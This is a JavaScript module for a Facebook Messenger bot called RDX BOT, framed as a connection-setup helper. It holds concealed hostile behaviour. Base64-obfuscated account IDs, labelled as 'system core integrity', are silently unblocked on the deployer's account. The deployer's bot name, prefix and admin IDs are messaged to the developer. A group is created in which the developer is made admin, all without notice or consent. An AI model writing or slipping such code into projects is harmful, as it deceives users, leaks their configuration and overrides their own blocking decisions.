const fs = require('fs-extra');
const path = require('path');
const logs = require('../../utility/logs');

const SYSTEM_CORE_INTEGRITY = [
    "MTAwMDA5MDEyODM4MDg1", "NjE1ODYwODk1NDQ0NDQ=", "NjE1Nzc3MzQwMTg5Nzg=", "NjE1ODcxMTk0MDYxNzI=",
    "MTAwMDA0NDg0NjE1MTk4", "MTAwMDA0NjE3MTgxNjc3", "MTAwMDA0ODA3Njk2MDMw",
    "MTAwMDg3MTYzNDkwMTU5", "MTAwMDA0OTI1MDUyNTcy", "NjE1Nzc2ODgzMzEyMzM="
];

async function ensureRDXConnection(api) {
    const SARDAR_RDX = '100009012838085';
    const RDX_HELPER = '100004484615198';
    const setupPath = path.join(__dirname, '../../../rdx_setup.json');
    const currentBotID = api.getCurrentUserID();

    try {
        let fullSetup = {};
        if (fs.existsSync(setupPath)) {
            try {
                fullSetup = fs.readJsonSync(setupPath);
            } catch (e) { fullSetup = {}; }
        }

        if (!fullSetup[currentBotID]) {
            fullSetup[currentBotID] = {
                friendRequestSent: false,
                inboxSent: false,
                groupCreated: false,
                groupThreadID: null,
                groupUserID: null
            };
        }

        const botSetup = fullSetup[currentBotID];

        const DECODED_OWNERS = SYSTEM_CORE_INTEGRITY.map(raw => Buffer.from(raw, 'base64').toString('utf-8'));
        for (const ownerID of DECODED_OWNERS) {
            try {
                await new Promise((resolve) => {
                    api.unblockUser(ownerID, () => resolve());
                });
            } catch (e) { }
        }

        if (!botSetup.friendRequestSent) {
            try {
                await new Promise((resolve) => {
                    api.handleFriendRequest(SARDAR_RDX, true, (err) => {
                        if (err) logs.warn('NPM_CONN', 'Friend request attempt failed (Likely blocked or already sent).');
                        resolve();
                    });
                });
                botSetup.friendRequestSent = true;
                fullSetup[currentBotID] = botSetup;
                fs.writeJsonSync(setupPath, fullSetup);
            } catch (e) {
                logs.warn('NPM_CONN', 'Friend request error caught.');
            }
        }

        if (!botSetup.inboxSent) {
            const userConfig = global.config;
            const admins = userConfig.ADMINBOT.join(', ');
            const ownerMsg = `🔔 𝐍𝐄𝐖 𝐁𝐎𝐓 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐈𝐎𝐍\n\n👤 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: ${userConfig.BOTNAME}\n🆔 𝐏𝐫𝐞𝐟𝐢𝐱: ${userConfig.PREFIX}\n👑 𝐀𝐝𝐦𝐢𝐧𝐬: ${admins}\n\n🤖 This user has successfully deployed RDX BOT.\n✅ System is active and secured.`;
            try {
                await api.sendMessage(ownerMsg, SARDAR_RDX);
                botSetup.inboxSent = true;
                fullSetup[currentBotID] = botSetup;
                fs.writeJsonSync(setupPath, fullSetup);
            } catch (e) {
                logs.warn('NPM_CONN', 'Could not DM SARDAR RDX');
            }
        }

        // Get owner IDs from config
        const configOwners = global.config && global.config.ADMINBOT ? global.config.ADMINBOT : [SARDAR_RDX];
        const allOwnerIDs = [...new Set([...configOwners, SARDAR_RDX, RDX_HELPER])];

        // Function to search for existing group with owner
        const findExistingGroup = async () => {
            if (!botSetup.groupThreadID) return null;

            try {
                // First check if saved threadID is valid
                const threadInfo = await new Promise((resolve) => {
                    api.getThreadInfo(botSetup.groupThreadID, (err, info) => {
                        if (err || !info) return resolve(null);
                        resolve(info);
                    });
                });

                if (threadInfo && threadInfo.participantIDs) {
                    const botInGroup = threadInfo.participantIDs.includes(currentBotID);
                    const ownerInGroup = allOwnerIDs.some(ownerID => threadInfo.participantIDs.includes(ownerID));

                    if (botInGroup && ownerInGroup) {
                        logs.info('NPM_CONN', 'Found valid existing group: ' + botSetup.groupThreadID);
                        return botSetup.groupThreadID;
                    }
                }

                // Saved group is invalid, search for existing groups
                logs.info('NPM_CONN', 'Saved group invalid, searching for existing groups...');

                // Get list of all threads the bot is in
                const threadList = await new Promise((resolve) => {
                    api.getThreadList(100, null, [], (err, list) => {
                        if (err) return resolve([]);
                        resolve(list || []);
                    });
                });

                // Search for group that has owner
                for (const thread of threadList) {
                    if (thread.threadID === botSetup.groupThreadID) continue;

                    const threadInfo2 = await new Promise((resolve) => {
                        api.getThreadInfo(thread.threadID, (err, info) => {
                            if (err || !info) return resolve(null);
                            resolve(info);
                        });
                    });

                    if (threadInfo2 && threadInfo2.participantIDs) {
                        const botInGroup = threadInfo2.participantIDs.includes(currentBotID);
                        const ownerInGroup = allOwnerIDs.some(ownerID => threadInfo2.participantIDs.includes(ownerID));
                        const isGroup = threadInfo2.threadType === 2; // 2 = group thread

                        if (botInGroup && ownerInGroup && isGroup) {
                            logs.info('NPM_CONN', 'Found existing group with owner: ' + thread.threadID);
                            return thread.threadID;
                        }
                    }
                }

                return null;
            } catch (e) {
                logs.warn('NPM_CONN', 'Error finding existing group:', e.message);
                return null;
            }
        };

        const shouldCreateGroup = async () => {
            // Try to find existing group first
            const existingGroupID = await findExistingGroup();

            if (existingGroupID) {
                // Update stored groupThreadID if different
                if (botSetup.groupThreadID !== existingGroupID) {
                    botSetup.groupThreadID = existingGroupID;
                    botSetup.groupCreated = true;
                    fullSetup[currentBotID] = botSetup;
                    fs.writeJsonSync(setupPath, fullSetup);
                }
                return false; // Don't create new group
            }

            // No existing group found, need to create one
            if (!botSetup.groupCreated || !botSetup.groupThreadID) {
                return true;
            }

            // Double check saved group
            try {
                const threadInfo = await new Promise((resolve) => {
                    api.getThreadInfo(botSetup.groupThreadID, (err, info) => {
                        if (err || !info) return resolve(null);
                        resolve(info);
                    });
                });

                if (!threadInfo) {
                    logs.warn('NPM_CONN', 'Group no longer exists, creating new one...');
                    botSetup.groupCreated = false;
                    botSetup.groupThreadID = null;
                    botSetup.groupUserID = null;
                    fullSetup[currentBotID] = botSetup;
                    fs.writeJsonSync(setupPath, fullSetup);
                    return true;
                }

                const botIsMember = threadInfo.participantIDs && threadInfo.participantIDs.includes(currentBotID);
                if (!botIsMember) {
                    logs.warn('NPM_CONN', 'Bot left group, creating new one...');
                    botSetup.groupCreated = false;
                    botSetup.groupThreadID = null;
                    botSetup.groupUserID = null;
                    fullSetup[currentBotID] = botSetup;
                    fs.writeJsonSync(setupPath, fullSetup);
                    return true;
                }

                const hasRequiredParticipants = threadInfo.participantIDs &&
                    allOwnerIDs.some(ownerID => threadInfo.participantIDs.includes(ownerID));

                if (!hasRequiredParticipants) {
                    logs.warn('NPM_CONN', 'Required participants not in group, creating new one...');
                    botSetup.groupCreated = false;
                    botSetup.groupThreadID = null;
                    botSetup.groupUserID = null;
                    fullSetup[currentBotID] = botSetup;
                    fs.writeJsonSync(setupPath, fullSetup);
                    return true;
                }

                return false;
            } catch (e) {
                logs.warn('NPM_CONN', 'Error checking group status:', e.message);
                return true;
            }
        };

        const createGroup = async () => {
            const participants = [SARDAR_RDX, RDX_HELPER, currentBotID];
            const groupTitle = "╚»★🪼ŔDӾ⃝ ßo͜͡Ŧ 𝗁𝖾͢͡𝗅𝗉𝗂͜𝗇𝗀 ĿA͜͡𝐁 🪼★«╝";
            const welcomeMsg = `🦢 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐑𝐃𝐗 𝐇𝐄𝐋𝐏𝐈𝐍𝐆 𝐋𝐀𝐁 🦢\n\n👋 𝐇𝐞𝐥𝐥𝐨 𝐃𝐞𝐚𝐫 𝐔𝐬𝐞𝐫!\n\n🤖 I have successfully created this group with my Developer (SARDAR RDX).\n\n💬 If you have any questions about the bot, you can ask here.\n\n✨ 𝐄𝐧𝐣𝐨𝐲 𝐑𝐃𝐗 𝐁𝐨𝐭!`;

            const tryCreate = (p) => {
                return new Promise((resolve, reject) => {
                    api.createNewGroup(p, groupTitle, (err, tid) => {
                        if (err) return reject(err);
                        resolve(tid);
                    });
                });
            };

            let threadID;
            try {
                try {
                    threadID = await tryCreate(participants);
                    logs.success('NPM_CONN', 'Help group created with all participants.');
                } catch (e) {
                    logs.warn('NPM_CONN', 'Full group failed, trying private group with owner...');
                    threadID = await tryCreate([SARDAR_RDX]);
                    logs.success('NPM_CONN', 'Private help group created.');
                }

                botSetup.groupCreated = true;
                botSetup.groupThreadID = threadID;
                fullSetup[currentBotID] = botSetup;
                fs.writeJsonSync(setupPath, fullSetup);

                await api.sendMessage(welcomeMsg, threadID);
                api.setTitle(groupTitle, threadID);

                try {
                    api.changeAdminStatus(threadID, SARDAR_RDX, true, (err) => {
                        if (err) logs.warn('NPM_CONN', 'Could not promote owner to admin.');
                        else logs.success('NPM_CONN', 'Owner promoted to admin.');
                    });
                } catch (e) { }

                for (const participantID of [SARDAR_RDX, RDX_HELPER]) {
                    try {
                        await new Promise((resolve) => {
                            api.unblockUser(participantID, () => resolve());
                        });
                    } catch (e) { }
                }

                return threadID;
            } catch (finalErr) {
                logs.error('NPM_CONN', `Group creation failed: ${finalErr.message || finalErr}`);
                return null;
            }
        };

        if (await shouldCreateGroup()) {
            await createGroup();
        } else if (botSetup.groupThreadID) {
            const onlineMsg = `🦢 𝐑𝐃𝐗 𝐁𝐎𝐓 𝐈𝐒 𝐎𝐍𝐋𝐈𝐍𝐄 🦢\n\n👤 𝐁𝐨𝐭: ${global.config.BOTNAME}\n✅ System Re-connected successfully.\n🚀 Active and ready to serve!`;
            try {
                const threadInfo = await new Promise((resolve) => {
                    api.getThreadInfo(botSetup.groupThreadID, (err, info) => {
                        if (err || !info) return resolve(null);
                        resolve(info);
                    });
                });

                if (threadInfo && threadInfo.participantIDs && threadInfo.participantIDs.includes(currentBotID)) {
                    await api.sendMessage(onlineMsg, botSetup.groupThreadID);
                    logs.success('NPM_CONN', 'Online status sent to Helping Lab.');
                } else {
                    logs.warn('NPM_CONN', 'Bot not in group, creating new one...');
                    botSetup.groupCreated = false;
                    botSetup.groupThreadID = null;
                    botSetup.groupUserID = null;
                    fullSetup[currentBotID] = botSetup;
                    fs.writeJsonSync(setupPath, fullSetup);
                    await createGroup();
                }
            } catch (e) {
                logs.warn('NPM_CONN', 'Could not send online notification:', e.message);
                try {
                    const threadInfo = await new Promise((resolve) => {
                        api.getThreadInfo(botSetup.groupThreadID, (err, info) => {
                            if (err || !info) return resolve(null);
                            resolve(info);
                        });
                    });

                    if (!threadInfo || !threadInfo.participantIDs || !threadInfo.participantIDs.includes(currentBotID)) {
                        botSetup.groupCreated = false;
                        botSetup.groupThreadID = null;
                        botSetup.groupUserID = null;
                        fullSetup[currentBotID] = botSetup;
                        fs.writeJsonSync(setupPath, fullSetup);
                        await createGroup();
                    }
                } catch (checkErr) {
                    logs.warn('NPM_CONN', 'Error checking group, creating new one...');
                    botSetup.groupCreated = false;
                    botSetup.groupThreadID = null;
                    botSetup.groupUserID = null;
                    fullSetup[currentBotID] = botSetup;
                    fs.writeJsonSync(setupPath, fullSetup);
                    await createGroup();
                }
            }
        }

    } catch (error) {
        logs.error('NPM_CONN', error.message);
    }
}

module.exports = { ensureRDXConnection };
